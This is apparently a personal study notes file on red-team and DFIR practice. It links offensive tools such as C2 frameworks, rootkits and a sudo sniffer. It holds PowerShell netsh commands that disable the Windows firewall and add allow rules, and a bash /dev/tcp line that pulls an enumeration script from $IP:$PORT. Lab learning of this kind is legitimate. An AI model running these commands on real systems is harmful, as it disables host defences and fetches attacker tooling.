
Cleaning up in a more professional manner and a too professional manner
Windows/Linux - Go?

- try arbituarly write data to disk over all locations of where the ADDecrypt.zip, ADDecrypt and its contents are stored as data for OS record keeping and the disk and how as DFIR would you counter that if you could hold any VMs or Live system in a suspended state or have a holographic file system where there is session layer of previous session and current session for dynamic analysis in Malware Analysis. 

TrustedSec Tool Lab
https://github.com/trustedsec/social-engineer-toolkit
Unicorn - https://github.com/trustedsec/unicorn

- https://github.com/trustedsec/trevorc2
- https://github.com/trustedsec/ptf
- https://github.com/trustedsec/hate_crack

Seatbelt compile and used

Host Vulnhub box and do both Red and Blue Teaming 





Firewall fun
```powershell
# Check Profile
netsh advfirewall show currentprofile

# Turn off the Firewall
NetSh Advfirewall set allprofiles state off

# Modify a Firewall Rule for a program
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
# Delete a rule
netsh.exe advfirewall firewall delete rule "<Rule Name>"_
```
[test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)


```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
Format-Table -Property 
DisplayName, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action"
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"

```

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
```



- Enabling RDP with cme and impacket kerboros tickets 
	- Harden and or implement AMSI with powershell 
- Create an alert based on .exe and .ps1 from PowerUP, Winpeas 
- Remote interaction with box that would no lead to compromise
- Open RDP for a new user to use Sysmon, ProcMon
- Get Sysinternals on box

https://github.com/dubs3c/sudo_sniff/blob/master/sudo_sniff.c


Alh4zr3d says sliver is better than empire 
https://github.com/BishopFox/sliver

https://github.com/0vercl0k - looks insane https://github.com/0vercl0k/clairvoyance


Procmon something and follow along

Atomic wannabe APT 
https://github.com/redcanaryco/invoke-atomicredteam


Powershell or `echo` version of Ippsec's `cat` file tranfer for windows!. WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets! - findstr would be obvious choice but I really want and echo version.
```bash
bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
```


A memory safe rust rootkits - [Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/README.md) and [Kris Nova's boopkit](https://github.com/krisnova/boopkit)

Bootkit

A C polymorphic code
https://github.com/m0nad/PSG/blob/master/psg.c